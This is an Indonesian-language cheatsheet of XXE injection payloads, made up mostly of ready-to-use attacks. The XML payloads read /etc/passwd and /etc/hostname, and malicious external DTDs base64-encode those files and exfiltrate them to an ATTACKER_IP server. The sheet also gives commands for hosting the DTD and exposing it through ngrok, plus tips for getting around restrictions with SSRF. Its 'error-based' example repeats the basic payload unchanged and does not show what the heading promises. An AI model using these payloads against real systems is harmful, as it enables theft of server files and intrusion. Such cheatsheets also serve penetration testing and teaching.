# XXE Injection Cheatsheet

## 1. Payload Dasar XXE

Membaca file lokal (`/etc/passwd`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
    <data>&xxe;</data>
</root>
```

---

## 2. XXE Error-Based

Jika output tidak langsung terlihat, kadang error message akan menampilkan hasil pembacaan file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
    <data>&xxe;</data>
</root>
```

---

## 3. XXE Out-of-Band (OOB) dengan Custom DTD

### a. Menyiapkan Server untuk Exfiltration

Jalankan HTTP server di direktori yang berisi `evil.dtd`:

```bash
python3 -m http.server 1337
# atau
php -S 0.0.0.0:1337
```

Untuk akses publik, gunakan ngrok:

```bash
ngrok http 1337
```

### b. Contoh isi `evil.dtd`

```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```

### c. Payload XXE untuk Memanggil DTD Eksternal

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:1337/evil.dtd">
  %xxe;
]>
<root>
    <data>&exfil;</data>
</root>
```

---

## 4. Membaca File Lain (misal `/etc/hostname`)

**evil-hostname.dtd:**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % oob "<!ENTITY send SYSTEM 'http://ATTACKER_IP:1337/?host=%file;'>">
%oob;
```

**Payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:1337/evil-hostname.dtd">
  %xxe;
]>
<root>
    <data>&send;</data>
</root>
```

---

## 5. Tips & Catatan

- Ganti `ATTACKER_IP` dengan IP publik/ngrok kamu.
- Gunakan base64 encode agar data tidak corrupt saat exfiltration.
- Beberapa aplikasi membatasi akses DTD eksternal, gunakan SSRF jika memungkinkan.
- Cek dokumentasi parser XML yang digunakan untuk mengetahui fitur yang bisa dieksploitasi.

---

## 6. Deteksi XXE

- Coba upload XML dengan entity eksternal dan lihat respon aplikasi.
- Gunakan tools seperti Burp Suite untuk menganalisa dan memodifikasi request XML.
